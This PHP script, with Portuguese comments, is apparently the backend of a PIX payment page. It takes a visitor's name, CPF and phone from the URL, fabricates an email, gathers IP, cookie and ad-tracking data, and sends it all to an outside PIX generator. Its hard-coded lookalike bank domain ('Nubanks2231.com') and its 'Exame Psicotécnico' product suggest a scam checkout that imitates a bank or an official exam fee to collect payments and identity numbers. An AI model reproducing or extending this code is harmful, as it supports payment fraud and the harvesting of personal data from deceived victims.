<?php ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
require_once 'Logger.php';
require_once 'DataValidator.php';
require_once 'ApiException.php';
require_once 'utils.php';
require_once 'gen.php';

// Exemplo de uso:
// Pega os dados diretamente da URL
$nome_completo = isset($_GET['nome']) ? htmlspecialchars($_GET['nome']) : null;
$cpf = isset($_GET['cpf']) ? htmlspecialchars($_GET['cpf']) : null;
$telefone = isset($_GET['numero']) ? htmlspecialchars($_GET['numero']) : null;

// Gera email fake (caso ainda necessário)
$email = strtolower(str_replace(' ', '.', explode(' ', $nome_completo)[0])) . rand(1000,9999) . '@teste.com';
if (!$cpf || !$nome_completo || !$telefone) {
    http_response_code(400);
    echo json_encode(['erro' => 'Nome, CPF e telefone são obrigatórios']);
    exit;
}

// gerar-pix.php
$config = require_once 'config.php';

// Configurações de cabeçalhos
header('Content-Type: application/json');
header("Access-Control-Allow-Origin: {$config['ALLOWED_ORIGINS']}");
header("Access-Control-Allow-Methods: GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Access-Control-Max-Age: 3600");

// Responder imediatamente para requisições OPTIONS
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Inicializa o logger
$logger = new Logger($config['LOG_DIR']);

try {
    // Valida e sanitiza os parâmetros GET
    $validator = new DataValidator();
$params = [
    'value' => isset($_GET['value']) ? $validator->sanitizeValue($_GET['value']) : null,
    'utm_source' => isset($_GET['utm_source']) ? htmlspecialchars($_GET['utm_source']) : null,
    'utm_medium' => isset($_GET['utm_medium']) ? htmlspecialchars($_GET['utm_medium']) : null,
    'utm_campaign' => isset($_GET['utm_campaign']) ? htmlspecialchars($_GET['utm_campaign']) : null,
    'utm_content' => isset($_GET['utm_content']) ? htmlspecialchars($_GET['utm_content']) : null,
    'utm_term' => isset($_GET['utm_term']) ? htmlspecialchars($_GET['utm_term']) : null,
    'reference' => isset($_GET['reference']) ? htmlspecialchars($_GET['reference']) : null,
    'name' => $nome_completo,
    'produto_nome' => 'Vaca',
    'email' => $email,
    'cpf' => $cpf,
    'telefone' => $telefone
];


    // Validações específicas
    if (!$params['value']) {
        throw new ApiException('Parâmetro "value" é obrigatório', 400, 'MISSING_VALUE');
    }

    $validator->validateMonetaryValue($params['value']);

    if ($params['email']) {
        $validator->validateEmail($params['email']);
    }

    // Dados fixos
    $string_checkout = "ViBGrih";
    $dominio = "Nubanks2231.com";
    $produto_id = isset($_GET['produto_id']) ? htmlspecialchars($_GET['produto_id']) : '295';
    // Monta payload para geração do Pix
    $pixData = [
        'name' => $params['name'] ?? '',
        'cpf' => $params['cpf'] ?? '',
        'email' => $params['email'] ?? 'email@gmail.com',
        'phone' => $params['telefone'] ?? '11996562635',
        'payment' => $string_checkout,
        'direct' => $dominio,
        'produto_id' => $produto_id,
        'valor' => str_replace(',', '.', $params['value']),
        'items' => [[
            'name' => $params['produto_nome'] ?? "Exame Psicotécnico",
            'price' => floatval(str_replace(',', '.', $params['value'])),
            'quantity' => 1,
            'subtotal' => floatval(str_replace(',', '.', $params['value']))
        ]],
        'tracking' => [
            'utm_source' => $params['utm_source'],
            'utm_medium' => $params['utm_medium'],
            'utm_campaign' => $params['utm_campaign'],
            'utm_term' => $params['utm_term'],
            'utm_content' => $params['utm_content'],
            'gclid' => $_GET['gclid'] ?? null,
            'fbclid' => $_GET['fbclid'] ?? null,
            'ttclid' => $_GET['ttclid'] ?? null,
            'msclkid' => $_GET['msclkid'] ?? null,
            'fbp' => $_COOKIE['_fbp'] ?? null,
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? null,
            'ip_address' => $_SERVER['REMOTE_ADDR'] ?? null,
        ],
        'quantity' => 1,
        'timestamp' => date('c')
    ];

    // Envia para o gerador de PIX
    $pixResponse = makeCurlRequest('https://pay.arkwave.space/gerar.php', 'POST', $pixData);

    if (!$pixResponse || $pixResponse['status'] !== 200) {
        throw new ApiException('Erro ao gerar código PIX. Por favor, tente novamente.', 500);
    }

    $pixData = json_decode($pixResponse['data'], true);
    if (json_last_error() !== JSON_ERROR_NONE) {
        throw new ApiException('Erro ao processar resposta do PIX.', 500);
    }

    $response = [
        'success' => true,
        'data' => [
            'copiaecola' => $pixData['qrcode'] ?? '',
            'qrcode_image' => $pixData['qrcode_image'] ?? '',
            'transactionId' => $pixData['id'] ?? ''
        ]
    ];

    echo json_encode($response);// Captura os parâmetros da URL atual
$queryParams = $_GET;

// Adiciona o novo parâmetro (ou sobrescreve se já existir)
$queryParams['transactionId'] = $pixData['id'];

// Reconstrói a query string
$newQueryString = http_build_query($queryParams);

// Redireciona mantendo todos os parâmetros
header('Location: pagamento/?' . $newQueryString);

} catch (ApiException $e) {
    $logger->logError($e);
    http_response_code($e->getCode());
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage(),
        'code' => $e->getErrorCode()
    ]);
} catch (Exception $e) {
    $logger->logError($e);
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => 'Erro interno no servidor'
    ]);
}
